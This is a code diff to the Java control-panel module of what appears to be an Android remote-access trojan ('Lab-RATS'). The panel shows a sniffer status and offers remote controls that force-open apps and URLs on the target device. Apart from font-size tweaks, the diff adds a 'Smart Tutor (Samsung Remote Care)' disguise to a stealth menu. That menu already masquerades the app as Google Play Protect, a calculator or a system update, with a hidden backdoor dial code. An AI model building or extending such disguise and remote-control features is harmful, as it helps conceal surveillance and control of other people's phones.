@@ -62,31 +62,31 @@ public class TerminalModule extends BaseModule {
         // Status Monitor Card
         html.append("<div class=\"card\">");
         String snifferStatus = StatusNotification.isServiceRunning() ? 
-            "<span style=\"color:var(--neon-green); font-size:0.65rem; vertical-align:middle;\">INTEL_ACTIVE</span>" : 
-            "<span style=\"color:var(--danger); font-size:0.65rem; vertical-align:middle;\">INTEL_OFFLINE</span>";
+            "<span style=\"color:var(--neon-green); font-size:0.7rem; vertical-align:middle;\">INTEL_ACTIVE</span>" :
+            "<span style=\"color:var(--danger); font-size:0.7rem; vertical-align:middle;\">INTEL_OFFLINE</span>";
         html.append("<h2 style=\"margin:0; letter-spacing:1px; line-height:1.2; text-align: left; font-size: 1.6rem;\">SYSTEM_MONITOR ").append(snifferStatus).append("</h2>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
 
         html.append("<div style=\"margin-top: 15px;\">");
-        html.append("<div style=\"font-size:0.6rem; opacity:0.5; font-family:monospace; margin-bottom:15px; text-align: left;\">SESSION_ID: ").append(sessionId).append("</div>");
+        html.append("<div style=\"font-size:0.8rem; opacity:0.5; font-family:monospace; margin-bottom:15px; text-align: left;\">SESSION_ID: ").append(sessionId).append("</div>");
         
         html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; justify-content: center;\">");
         
         // Server Status
         html.append("<div style=\"padding: 30px 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.4); text-align: center;\">");
-        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem;\">UPLINK_STATUS</div>");
+        html.append("<div class=\"info-label\" style=\"font-size: 0.8rem;\">UPLINK_STATUS</div>");
         html.append("<div style=\"font-size: 1.6rem; font-weight: bold; color: var(--neon-green); margin-top: 10px;\">ONLINE</div>");
         html.append("</div>");
         
         // Port
         html.append("<div style=\"padding: 30px 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.4); text-align: center;\">");
-        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem;\">ACCESS_PORT</div>");
+        html.append("<div class=\"info-label\" style=\"font-size: 0.8rem;\">ACCESS_PORT</div>");
         html.append("<div style=\"font-size: 1.6rem; font-weight: bold; color: var(--neon-cyan); margin-top: 10px;\">").append(server.getListeningPort()).append("</div>");
         html.append("</div>");
         
         // IP
         html.append("<div style=\"padding: 30px 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.4); text-align: center;\">");
-        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem;\">VIRTUAL_ADDRESS</div>");
+        html.append("<div class=\"info-label\" style=\"font-size: 0.8rem;\">VIRTUAL_ADDRESS</div>");
         html.append("<div style=\"font-size: 1.2rem; font-weight: bold; color: var(--neon-cyan); word-break: break-all; margin-top: 10px;\">").append(ipDisplay).append("</div>");
         html.append("</div>");
         
@@ -138,7 +138,7 @@ public class TerminalModule extends BaseModule {
         
         // 1. Device Sound Setting
         html.append("<div style=\"margin-bottom: 25px;\">");
-        html.append("<div class=\"info-label\" style=\"text-align: left; color: var(--neon-green); font-size: 0.7rem;\">DEVICE_SOUND_SETTING</div>");
+        html.append("<div class=\"info-label\" style=\"text-align: left; color: var(--neon-green); font-size: 0.8rem;\">DEVICE_SOUND_SETTING</div>");
         html.append("<div class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 15px;\">");
         html.append("<select id=\"device-cmd-selector\" style=\"background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); border: 1px solid var(--neon-green); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
         html.append("<option value=\"vibrate\">VIBRATE_DEVICE</option>");
@@ -150,7 +150,7 @@ public class TerminalModule extends BaseModule {
 
         // 2. Force Open App
         html.append("<div style=\"margin-bottom: 25px;\">");
-        html.append("<div class=\"info-label\" style=\"text-align: left; color: var(--neon-cyan); font-size: 0.7rem;\">FORCE_OPEN_APP</div>");
+        html.append("<div class=\"info-label\" style=\"text-align: left; color: var(--neon-cyan); font-size: 0.8rem;\">FORCE_OPEN_APP</div>");
         html.append("<div class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 15px;\">");
         html.append("<select id=\"app-selector\" style=\"background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); border: 1px solid var(--neon-cyan); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
         html.append("<option value=\"\" style=\"background:#000;\">Select App...</option>");
@@ -163,7 +163,7 @@ public class TerminalModule extends BaseModule {
 
         // 3. Force Open URL
         html.append("<div style=\"margin-bottom: 25px;\">");
-        html.append("<div class=\"info-label\" style=\"text-align: left; color: var(--neon-cyan); font-size: 0.7rem;\">FORCE_OPEN_URL</div>");
+        html.append("<div class=\"info-label\" style=\"text-align: left; color: var(--neon-cyan); font-size: 0.8rem;\">FORCE_OPEN_URL</div>");
         html.append("<div class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 15px;\">");
         html.append("<input id=\"target-url\" type=\"text\" placeholder=\"https://example.com\" style=\"background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); border: 1px solid var(--neon-cyan); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
         html.append("<button onclick=\"openUrl()\" class=\"btn\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); width: 210px !important; margin: 0;\">EXECUTE</button>");
@@ -175,12 +175,13 @@ public class TerminalModule extends BaseModule {
         html.append("<h2 style=\"color: var(--neon-orange); font-size: 1.15rem; text-align: left;\">STEALTH_OPERATIONS <span class=\"info-trigger\" onclick=\"showInfo(event, 'STEALTH_OPERATIONS', 'Advanced application camouflage. Choose an identity to masquerade as a functional decoy. Use dial pad code &lt;b&gt;*#1337#&lt;/b&gt; or the hidden backdoor to restore access.')\">INFO</span></h2>");
         
         html.append("<div style=\"margin-bottom: 15px; display: flex; flex-direction: column; align-items: flex-start;\">");
-        html.append("<label class=\"info-label\" style=\"align-self: flex-start; font-size: 0.7rem;\">MASQUERADE_IDENTITY:</label>");
+        html.append("<label class=\"info-label\" style=\"align-self: flex-start; font-size: 0.8rem;\">MASQUERADE_IDENTITY:</label>");
         html.append("<select id=\"stealth-type\" style=\"width:100%; max-width:450px; background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); border:1px solid var(--neon-orange); color:#fff; padding:10px; border-radius:8px; outline:none; font-family:monospace; margin-top:5px;\">");
         html.append("<option value=\"settings\">Play Protect (Google Shield)</option>");
         html.append("<option value=\"calc\">Calculator</option>");
         html.append("<option value=\"weather\">Weather</option>");
         html.append("<option value=\"update\">System Update</option>");
+        html.append("<option value=\"smarttutor\">Smart Tutor (Samsung Remote Care)</option>");
         html.append("<option value=\"logo\">Lab-RATS Logo (Unmasked)</option>");
         html.append("</select>");
         html.append("</div>");
